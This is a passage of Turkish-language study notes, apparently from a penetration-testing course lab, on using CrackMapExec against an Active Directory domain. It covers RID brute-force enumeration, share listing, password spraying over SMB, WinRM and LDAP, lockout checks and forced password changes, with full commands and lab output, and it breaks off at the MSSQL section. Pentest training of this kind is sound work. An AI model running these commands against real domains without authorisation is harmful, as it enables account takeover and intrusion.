Burada, herhangi bir hesap olmadan tüm domain kullanıcılarını ve password policy'yi listeleyebiliriz. Bu yapılandırma her zaman mevcut olmayabilir, ancak mevcutsa, domain'i ele geçirme amacımıza başlamak için bize yardımcı olacaktır.


### Kullanıcıları rid bruteforce ile numaralandırma

Bir domainin kullanıcılarını belirlemek için --rid-brute seçeneği kullanılabilir. Bu seçenek özellikle NULL Authentication'a sahip ancak belirli sorgu kısıtlamaları olan bir domain ile uğraşırken kullanışlıdır. Bu seçeneği kullanarak, domain'deki kullanıcıları ve diğer nesneleri numaralandırabiliriz.


### Enumerating Users with --rid-brute

```
crackmapexec smb 10.129.204.172 -u '' -p '' --rid-brute

SMB 10.129.204.172 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True)
(SMBv1:False)
SMB 10.129.204.172 445 DC01 [+] Brute forcing RIDs
SMB 10.129.204.172 445 DC01 498:
INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB 10.129.204.172 445 DC01 500:
INLANEFREIGHT\Administrator (SidTypeUser)
SMB 10.129.204.172 445 DC01 501:
INLANEFREIGHT\Guest (SidTypeUser)
SMB 10.129.204.172 445 DC01 502:
INLANEFREIGHT\krbtgt (SidTypeUser)
SMB 10.129.204.172 445 DC01 512:
INLANEFREIGHT\Domain Admins (SidTypeGroup)
SMB 10.129.204.172 445 DC01 513:
INLANEFREIGHT\Domain Users (SidTypeGroup)
...SNIP...
SMB 10.129.204.172 445 DC01 1853:
INLANEFREIGHT\abinateps (SidTypeUser)
SMB 10.129.204.172 445 DC01 1854:
INLANEFREIGHT\bustoges (SidTypeUser)
SMB 10.129.204.172 445 DC01 1855:
INLANEFREIGHT\nobseellace (SidTypeUser)
SMB 10.129.204.172 445 DC01 1856:
INLANEFREIGHT\wormithe (SidTypeUser)
SMB 10.129.204.172 445 DC01 1857:
INLANEFREIGHT\therbanstook (SidTypeUser)
SMB 10.129.204.172 445 DC01 1858:
INLANEFREIGHT\sweend (SidTypeUser)
SMB 10.129.204.172 445 DC01 1859:
INLANEFREIGHT\voge1993 (SidTypeUser)
SMB 10.129.204.172 445 DC01 1860:
INLANEFREIGHT\lach1973 (SidTypeUser)
SMB 10.129.204.172 445 DC01 1861:
INLANEFREIGHT\coulart77 (SidTypeUser)
SMB 10.129.204.172 445 DC01 1862:
INLANEFREIGHT\whirds (SidTypeUser)
SMB 10.129.204.172 445 DC01 1863:
INLANEFREIGHT\sturhe (SidTypeUser)
SMB 10.129.204.172 445 DC01 1864:
INLANEFREIGHT\turittly (SidTypeUser)
...SNIP...
```


Varsayılan olarak, `--rid-brute`, RIDs değerlerini brute force ile 4000'e kadar enumerate eder. Davranışını değiştirmek için `--rid-brute [MAX_RID]` kullanabiliriz.

**Not:** Bazı senaryolarda, NULL authentication ile RIDs brute force yapılabilir.


### Enumerating Shares

Paylaşılan klasörler ile ilgili olarak, server konfigürasyonuna bağlı olarak, herhangi bir hesap kullanmadan sadece `--shares` seçeneğini yazarak paylaşımlara erişebiliriz. Eğer hata alırsak, paylaşılan klasörleri listelemek için var olmayan rastgele bir isim veya guest/anonymous hesaplarını şifresiz olarak deneyebiliriz.

#### Enumerating Shares

```
crackmapexec smb 10.129.203.121 -u '' -p '' --shares

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\:
SMB 10.129.203.121 445 DC01 [-] Error enumerating
shares: STATUS_ACCESS_DENIED
```


```
crackmapexec smb 10.129.203.121 -u guest -p '' --shares
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\guest:
SMB 10.129.203.121 445 DC01 [+] Enumerated shares
SMB 10.129.203.121 445 DC01 Share
Permissions Remark
SMB 10.129.203.121 445 DC01 ----- ------
----- ------
SMB 10.129.203.121 445 DC01 ADMIN$
Remote Admin
SMB 10.129.203.121 445 DC01 C$
Default share
SMB 10.129.203.121 445 DC01 carlos
SMB 10.129.203.121 445 DC01 D$
Default share
SMB 10.129.203.121 445 DC01 david
SMB 10.129.203.121 445 DC01 IPC$ READ
Remote IPC
SMB 10.129.203.121 445 DC01 IT
SMB 10.129.203.121 445 DC01 john
SMB 10.129.203.121 445 DC01 julio
SMB 10.129.203.121 445 DC01 linux01
READ,WRITE
SMB 10.129.203.121 445 DC01 NETLOGON
Logon server share
SMB 10.129.203.121 445 DC01 svc_workstations
SMB 10.129.203.121 445 DC01 SYSVOL
Logon server share
SMB 10.129.203.121 445 DC01 Users READ
```


Topladığımız bilgiler, domain içinde foothold elde etmek için faydalı olabilir. Password policy'deki bilgileri kullanarak bir Password Spraying saldırısı düzenleyebilir, ASREPRoasting gibi saldırılar gerçekleştirebilir veya açık bir share folder üzerinden gizli bilgilere erişim sağlayabiliriz.

### Understanding Password Policy

Password Policy için Microsoft belgeleri, Windows için [password policy'lerine](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy) genel bir bakış ve her policy ayarı için bilgi bağlantıları sağlar.

Çıktıda gördüğümüz policy ayarlarından biri, 1 olarak ayarlanmış olan Domain Password Complex'tir.[ Password must meet complexity requirements]([Password must meet complexity requirements - Windows 10 | Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements)) politika ayarı, parolaların bir dizi güçlü parola yönergesini karşılaması gerekip gerekmediğini belirler. Etkinleştirildiğinde, bu ayar parolaların aşağıdaki ölçütleri karşılamasını gerektirir:

* Parolalar, kullanıcının `sAMAccountName` (kullanıcı hesabı adı) değerini veya `displayName`'in tamamını (tam ad değeri) içeremez. Her iki kontrol de büyük/küçük harfe duyarlı değildir.
* Parola aşağıdaki kategorilerden üçünden karakter içermelidir:
	* Avrupa dillerinin büyük harfleri (A'dan Z'ye, aksan işaretleri, Yunanca ve Kiril karakterleri ile birlikte)
	* Avrupa dillerinin küçük harfleri (a'dan z'ye, diyezli, aksan işaretli, Yunanca ve Kiril karakterli)
	*  Taban 10 basamakları (0 ile 9 arası)
	* Alfasayısal olmayan karakterler (özel karakterler):  (`~!@#$%^&*_-+=|\(){} []:;"'<>,.?/) Euro veya İngiliz Sterlini gibi para birimi sembolleri bu policy ayarı için özel karakter olarak sayılmaz.
	* Alfabetik karakter olarak sınıflandırılan ancak büyük veya küçük harf olmayan herhangi bir Unicode karakteri. Bu grup Asya dillerindeki Unicode karakterlerini içerir.

Not: Parolalar değiştirildiğinde veya oluşturulduğunda karmaşıklık gereksinimleri uygulanır.

Password Spraying saldırısı için numaralandırılması gereken bir diğer önemli parametre de `Account Lockout Threshold`'dur (Hesap Kilitleme Eşiği) . Bu policy ayarı, bir kullanıcı hesabının kilitlenmesine neden olacak başarısız oturum açma girişimlerinin sayısını belirler. Kilitli bir hesap, siz sıfırlayana kadar veya `CrackMapExec` çıktısında da görüntülenen Hesap Kilitleme Süresi policy ayarı tarafından belirtilen dakika sayısı sona erene kadar kullanılamaz.

Bu password politikasına göre, herhangi bir **hesap kilitleme politikası (lockout policy)** bulunmamaktadır. Bu nedenle, istediğimiz kadar parola denemesi yapabiliriz ve hesaplar kilitlenmez.

Bu politikaya göre, parolalar **en az yedi karakter** uzunluğunda olmalı ve **en az bir büyük harf, bir küçük harf ve bir özel karakter** içermelidir.

Not: CrackMapExec, varsa `Password Setting Objects`'i (PSO) değil, yalnızca `Default Password Policy`'yi kontrol eder.


Bu bölümde, **`NULL session authentication`** ile yapılandırılmış bir **domain**'den nasıl bilgi alacağımızı öğrendik.

Bir sonraki bölümde, bu bilgileri kullanarak **kimlik bilgilerini nasıl tespit edeceğimizi** öğreneceğiz.


### Password Spraying

NULL Session açığını kötüye kullanan kullanıcıların bir listesini bulduk. Şimdi domain'de bir yer edinmek için geçerli bir şifre bulmamız gerekiyor. Elimizde uygun bir kullanıcı listesi yoksa veya hedef `NULL Session` saldırısına karşı savunmasız değilse, geçerli kullanıcı adlarını bulmak için OSINT (yani `LinkedIn`'de avlanma), geniş bir kullanıcı adı listesi ve `Kerbrute` ile brute-forcing, fiziksel keşif vb. gibi başka bir yola ihtiyacımız olacaktır. Bu bölümde, bir kullanıcı adı listesine sahip olduğumuzda bir dizi hedefe karşı kimlik doğrulamayı test ederek geçerli bir kimlik bilgisi kümesini nasıl bulacağımızı öğreneceğiz.

### Creating a Password List

Bu kullanıcıların şifrelerini bilmiyoruz, ancak bildiğimiz şey şifre politikasıdır. `Welcome1` ve `Password123` gibi yaygın parolalardan oluşan özel bir sözcük listesi, sonunda yıl olan geçerli ay, şirket adı veya domain adı oluşturabilir ve farklı mutasyonlar uygulayabiliriz.  Parola olarak domain'in büyük harf, sayı ve sonunda ünlem işareti ile kullanalım:

### Password List & User List

```
cat passwords.txt
Inlanefreight01!
Inlanefreight02!
Inlanefreight03!
```


```
cat users.txt

noemi
david
carlos
grace
peter
robert
administrator
```


Şimdi **protocol** ve **target** seçmemiz ve `-u` seçeneğini kullanarak **username(ler)** veya **username içeren dosya(lar)** sağlamamız, `-p` seçeneğini kullanarak ise **password(ler)** veya **password içeren dosya(lar)** belirtmemiz gerekiyor. **SMB** **protocol**'ünü kullanarak bazı örneklere bakalım:


### Bir Dosya İçeren Username'ler ile Tek Bir Password Kullanarak Password Attack

```
crackmapexec smb 10.129.203.121 -u users.txt -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
```




### Bir Liste İçeren Username'ler ile Tek Bir Password Kullanarak Password Attack

```
crackmapexec smb 10.129.203.121 -u noemi david grace carlos -p
Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
```



### Bir Liste İçeren Username'ler ile İki Password Kullanarak Password Attack

```
crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p
Inlanefreight01! Inlanefreight02!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
```

Çıktıdan da görebileceğimiz gibi, yeşil renkle temsil edilen ve `[+]` çıktısıyla başlayan domain'de yalnızca bir geçerli kimlik bilgisi bulduk. Bununla birlikte, tüm hesaplar test edilmemiştir. İlk geçerli kimlik bilgileri bulunduktan sonra, `CME` `password spraying` işlemini `durdurur` çünkü bu genellikle domain numaralandırmasının geri kalanı için yeterlidir. Bazen, ayrıcalıklı bir hesap bulabileceğimiz için tüm hesapları test etmek daha iyidir. Bu amaçla, CME `--continue-on-success` seçeneği ile birlikte gelir:


### Continue on Success

```
crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p
Inlanefreight01! Inlanefreight02! --continue-on-success

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\grace:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\carlos:Inlanefreight02!

```

Ayrıca, her kullanıcı için tüm parolaları test edecek olan passwords.txt gibi bir dosya ile bir parola listesi sağlayabiliriz, bu password spraying için yararlı olabilir, ancak bir Hesap Kilitleme politikası ayarlandığında çok fazla değil. Hesap Kilitleme konusunu bu bölümün ilerleyen kısımlarında ele alacağız.

Hesap kilitlemenin 5 olarak ayarlandığını biliyorsak, bir hesabın kilitlenmesini önlemek için 2 veya 3 paroladan oluşan bir parola listesi oluşturabiliriz.


### Bir Liste İçeren Username'ler ile Bir Password List Kullanarak Password Attack

```
crackmapexec smb 10.129.203.121 -u users.txt -p passwords.txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight03! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight03! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\carlos:Inlanefreight02!
```


### Bir User ile Bir Password'ün Eşleşmesini Bir Wordlist Kullanarak Kontrol Etme

CME'nin bir başka harika özelliği de, her kullanıcının parolasını biliyorsak ve hala geçerli olup olmadıklarını test etmek istiyorsak. Bunun için `--no-bruteforce` seçeneğini kullanın. Bu seçenek 1. kullanıcıyı 1. parola ile, 2. kullanıcıyı 2. parola ile ve bu şekilde kullanacaktır.

### Bruteforcing Devre dışı bırak

```
cat userfound.txt
grace
carlos
```

```
cat passfound.txt
Inlanefreight01!
Inlanefreight02!
```

```
crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --nobruteforce --continue-on-success

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\carlos:Inlanefreight02!
```


### Testing Local Accounts

Domain hesabı yerine bir `lokal` hesabı test etmek istersek, CrackMapExec'te                  `--local-auth` seçeneğini kullanabiliriz:

### Lokal Hesap Nedir?

- **Lokal hesap**, bir bilgisayara **yalnızca o bilgisayarda** bulunan kullanıcı hesabıdır. Bu hesap, bir **domain**  yönetimi altında değildir.
- Örneğin, bir Windows bilgisayarda "`Administrator`" veya başka bir local kullanıcı hesabı, **lokal hesap**tır.
- Bu hesaplar, sadece o makinede geçerli kullanıcı adı ve şifreye sahiptir.

**Domain hesabı** ise bir **Active Directory (AD)** ortamında tanımlanmış kullanıcı hesabıdır ve domaindeki herhangi bir bilgisayarda kullanılabilir.


### Password Spraying Local Accounts

```
crackmapexec smb 192.168.133.157 -u Administrator -p Password@123 --localauth

SMB 192.168.133.157 445 WIN10 [*] Windows 10.0
Build 22000 x64 (name:WIN10) (domain:WIN10) (signing:False) (SMBv1:True)
SMB 192.168.133.157 445 WIN10 [+]
WIN10\Administrator:Password@123

```

Not: Domain Controller'ların lokal bir hesap veritabanı yoktur, bu yüzden bir Domain Controller'a karşı `--local-auth` bayrağını kullanamayız.


###  Account Lockout Hesap Kilitleme

**Password Spraying** gerçekleştirirken dikkatli olun. **Account Lockout Threshold** değerinin **None** olarak ayarlandığından emin olmamız gerekiyor. Eğer bir değer varsa (genellikle **5**), her **account** için deneme sayısına dikkat etmeli ve sayacın **0**'a sıfırlandığı zamanı gözlemlemeliyiz (genellikle **30 dakika**). Aksi takdirde, tüm **account**'ları **30 dakika veya daha uzun süre** kilitleme riski oluşur (**Locked Account Duration** değerini kontrol ederek sürenin ne kadar olduğunu öğrenebilirsiniz). Bazen **domain password policy**, bir **administrator**'ün **account**'ları manuel olarak açmasını gerektirecek şekilde yapılandırılmış olabilir. Bu durumda dikkatsiz yapılan **Password Spraying**, bir veya daha fazla **account**'ı kilitleyerek daha büyük bir sorun yaratabilir. Eğer zaten bir **user account**'ınız varsa, **Bad-Pwd-Count** attribute'u sorgulayabilirsiniz. Bu attribute, **user**'ın yanlış bir **password** kullanarak **account**'a giriş yapmayı kaç kez denediğini gösterir.


### **Bad Password Count** Sorgulama

```
crackmapexec smb 10.129.203.121 --users -u grace -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated domain
user(s)
SMB 10.129.203.121 445 DC01
inlanefreight.htb\alina badpwdcount: 0 desc:
SMB 10.129.203.121 445 DC01 
inlanefreight.htb\peter badpwdcount: 2 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\grace badpwdcount: 0 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\robert badpwdcount: 3 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\carlos badpwdcount: 1 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\svc_workstations badpwdcount: 0 desc:
SMB 10.129.203.121 445 DC01 inlanefreight.htb\john
badpwdcount: 0 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\david badpwdcount: 4 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\julio badpwdcount: 3 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\krbtgt badpwdcount: 0 desc: Key
Distribution Center Service Account
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Guest badpwdcount: 0 desc:
Built-in account for guest access to the computer/domain
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Administrator badpwdcount: 0 desc:
Built-in account for administering the computer/domain 
```

Bu bilgilerle, parola saldırıları için daha iyi bir strateji oluşturabilirsiniz.

Not: Kullanıcı doğru kimlik bilgileriyle kimlik doğrulaması yaparsa `Bad Password Count`  sıfırlanır.

Burada kaldım 
### Account Status

Bir hesabı test ettiğimizde, CME'nin görüntüleyebileceği üç renk vardır:

| Renk    | Açıklama                                                               |
| ------- | ---------------------------------------------------------------------- |
| Yeşil   | Kullanıcı adı ve şifre geçerli.                                        |
| Kırmızı | Kullanıcı adı veya şifre geçersiz.                                     |
| Magenta | Kullanıcı adı ve şifre geçerli, ancak kimlik doğrulama başarılı değil. |

Parola hala geçerliyken çeşitli nedenlerle kimlik doğrulama başarısız olabilir. İşte tam bir liste:

| Durum Kodu                    | Açıklama                         |
| ----------------------------- | -------------------------------- |
| STATUS_ACCOUNT_DISABLED       | Hesap devre dışı bırakılmış.     |
| STATUS_ACCOUNT_EXPIRED        | Hesap süresi dolmuş.             |
| STATUS_ACCOUNT_RESTRICTION    | Hesap kısıtlamalı.               |
| STATUS_INVALID_LOGON_HOURS    | Geçersiz oturum açma saatleri.   |
| STATUS_INVALID_WORKSTATION    | Geçersiz workstation.            |
| STATUS_LOGON_TYPE_NOT_GRANTED | Oturum açma türü verilmemiş.     |
| STATUS_PASSWORD_EXPIRED       | Şifre süresi dolmuş.             |
| STATUS_PASSWORD_MUST_CHANGE   | Şifrenin değiştirilmesi gerekli. |
| STATUS_ACCESS_DENIED          | Erişim reddedildi.               |

Nedenine bağlı olarak, örneğin, `STATUS_INVALID_LOGON_HOURS` veya `STATUS_INVALID_WORKSTATION` başka bir workstation veya başka bir zaman denemek için iyi bir fikir olabilir. `STATUS_PASSWORD_MUST_CHANGE` mesajı durumunda, [Impacket smbpasswd](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbpasswd.py) kullanarak kullanıcının şifresini şu şekilde değiştirebiliriz: `smbpasswd -r domain -U user` .


### Şifre Değiştirme: PASSWORD_MUST_CHANGE Durumundaki Hesap için

```
crackmapexec smb 10.129.203.121 -u julio peter -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\julio:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\peter:Inlanefreight01! STATUS_PASSWORD_MUST_CHANGE
```

Burada hedef kullanıcının şifresini değiştirebiliriz. Bir penetrasyon testinde, hesap şifrelerini değiştirme konusunda dikkatli olmalı ve yapılan her türlü hesap değişikliğini raporumuzun eklerinde not etmeliyiz. Hedef hesap uzun süredir giriş yapmamışsa, aktif olarak kullanılan bir hesaba göre şifreyi değiştirmek genellikle daha güvenlidir. Tipik olarak, bir organizasyon kullanılmayan hesapları devre dışı bırakır, ancak zaman zaman şifrelerini değiştirebileceğimiz unutulmuş hesaplarla karşılaşabiliriz ve bu, değerlendirme hedefimize daha da yaklaşmamıza yardımcı olabilir. Şüphe durumunda, her zaman herhangi bir değişiklik yapmadan önce müşteriyle iletişime geçin.

```
smbpasswd -r 10.129.203.121 -U peter

Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user peter
```

Artık yeni parola ile kimlik doğrulaması yapabiliriz.

```
crackmapexec smb 10.129.203.121 -u peter -p Password123

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\peter:Password123

```


### Target Protocol WinRM

Varsayılan olarak, esasen Remote Management (uzaktan yönetim) için tasarlanmış olan[ Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) servisi, bir hedef üzerinde PowerShell komutlarını çalıştırmamıza izin verir. WinRM, Windows Server 2012 R2 / 2016 / 2019 üzerinde `TCP/5985 (HTTP)` ve `TCP/5986 (HTTPS`) portlarında varsayılan olarak etkindir. PowerShell Remoting, [Yönetim için Web Hizmetleri (WSManagement)](https://www.dmtf.org/sites/default/files/standards/documents/DSP0226_1.2.0.pdf) protokolünün Microsoft uygulaması olan [Windows Remote Management'](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)ı (WinRM) kullanır

Bir remote bilgisayarda WinRM servisine bağlanmak için, `local administrator` ayrıcalıklarına sahip olmamız, `Remote Management Users` grubunun bir üyesi olmamız veya oturum yapılandırmasında `PowerShell Remoting` için açık izinlere sahip olmamız gerekir.

WinRM, bir parolanın geçerli olup olmadığını belirlemek için en iyi protokol değildir çünkü sadece WinRM erişimi varsa hesabın geçerli olduğunu belirtir. Bu senaryoda, bulduğumuz üç (3) hesabı test edebiliriz ve bu üç (3) hesaptan herhangi birinin WinRM erişimi olup olmadığını görmek için `--no-bruteforce` seçeneğini kullanabiliriz.


### WinRM - Password Spraying

```
crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --nobruteforce --continue-on-success

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\peter:Password123
```

```
crackmapexec winrm 10.129.203.121 -u userfound.txt -p passfound.txt --nobruteforce --continue-on-success

SMB 10.129.203.121 5985 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
HTTP 10.129.203.121 5985 DC01 [*]
http://10.129.203.121:5985/wsman
WINRM 10.129.203.121 5985 DC01 [-]
inlanefreight.htb\grace:Inlanefreight01!
WINRM 10.129.203.121 5985 DC01 [-]
inlanefreight.htb\robert:Inlanefreight01!
WINRM 10.129.203.121 5985 DC01 [+]
inlanefreight.htb\peter:Password123 (Pwn3d!)
```

Peter adlı hesabı ile sistemde komutlar çalıştırabiliriz, çünkü bu hesap Local administrator haklarına sahiptir. Bununla ilgili daha fazla bilgiyi `Command Execution` bölümünde ele alacağız.


### LDAP - Password Spraying 

LDAP protokolüne karşı Password Spraying yaparken `FQDN` kullanmamız gerekir, aksi takdirde hata alırız:

### IP kullanılırken hata oluştu

```
crackmapexec ldap 10.129.203.121 -u julio grace -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP 10.129.203.121 445 DC01 [-]
inlanefreight.htb\julio:Inlanefreight01! Error connecting to the domain,
are you sure LDAP service is running on the target ?
LDAP 10.129.203.121 445 DC01 [-]
inlanefreight.htb\grace:Inlanefreight01! Error connecting to the domain,
are you sure LDAP service is running on the target ?

```

Bu sorunu çözmek için iki seçeneğimiz var: saldırı hostumuzu domain name server (DNS) kullanacak şekilde yapılandırmak veya KDC FQDN'sini /etc/hosts dosyamızda yapılandırmak. İkinci seçeneği seçelim ve FQDN'yi /etc/hosts dosyamıza ekleyelim:


### FQDN'nin hosts dosyasına eklenmesi ve Password Spray İşleminin Gerçekleştirilmesi

```
cat /etc/hosts | grep inlanefreight
10.129.203.121 inlanefreight.htb dc01.inlanefreight.htb
```

```
crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p
Inlanefreight01!

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 445 DC01 [-]
inlanefreight.htb\julio:Inlanefreight01!
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01
```


### Authentication (Kimlik Doğrulama) Mekanizmaları

MSSQL, SSH veya FTP gibi bazı Windows servisleri, kendi kullanıcı veritabanlarını işleyecek veya Windows ile entegre olacak şekilde yapılandırılabilir. Bu durumda, servis tarafından kullanılan local veritabanına, Active Directory kullanıcılarına veya servisin kurulu olduğu bilgisayarın local kullanıcılarına karşı Password Spray deneyebiliriz. Farklı kimlik doğrulama mekanizmaları aracılığıyla bir MSSQL Sunucusuna karşı nasıl Passowrd Spray gerçekleştirebileceğimizi görelim.


### MSSQL - Password Spray

Microsoft SQL Server (MSSQL), verileri tablolarda, sütunlarda ve satırlarda saklayan ilişkisel bir veritabanı yönetim sistemidir. Veritabanları hostları, kullanıcı kimlik bilgileri, Personal Identifiable Information (PII), işle ilgili veriler ve ödeme bilgileri dahil ancak bunlarla sınırlı olmamak üzere her türlü hassas verinin depolanmasından sorumlu oldukları için yüksek hedef olarak kabul edilirler.


### MSSQL Authentication Mechanisms

MSSQL iki [authentication modunu](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server) destekler, bu da kullanıcıların Windows veya SQL Server'da oluşturulabileceği anlamına gelir:

| **Authentication Type**         | **Description**                                                                                                                                                                                                                                                                                                                                                                    |
| ------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Windows authentication mode** | Bu, varsayılan olan ve genellikle entegre güvenlik olarak adlandırılan moddur, çünkü SQL Server güvenlik modeli Windows/Active Directory ile sıkı bir şekilde entegre edilmiştir. Belirli Windows kullanıcıları ve grup hesapları SQL Server'a giriş yapmaya yetkilidir. Zaten kimlik doğrulaması yapılmış Windows kullanıcılarının, ek kimlik bilgileri sunmalarına gerek yoktur. |
| **Mixed mode**                  | Mixed mode, Windows/Active Directory hesapları ve SQL Server kimlik doğrulamasını destekler. Kullanıcı adı ve şifre çiftleri SQL Server içinde saklanır.                                                                                                                                                                                                                           |

Bu, `MSSQL`'de kimlik doğrulaması yapmak için üç tür kullanıcıya sahip olabileceğimiz anlamına gelir:

1. Active Directory Account. 
2. Local Windows Account. 
3. SQL Account.

Bir Active Directory hesabı için domain adını belirtmemiz gerekir:

### Password Spray - Active Directory Account

```
crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01!

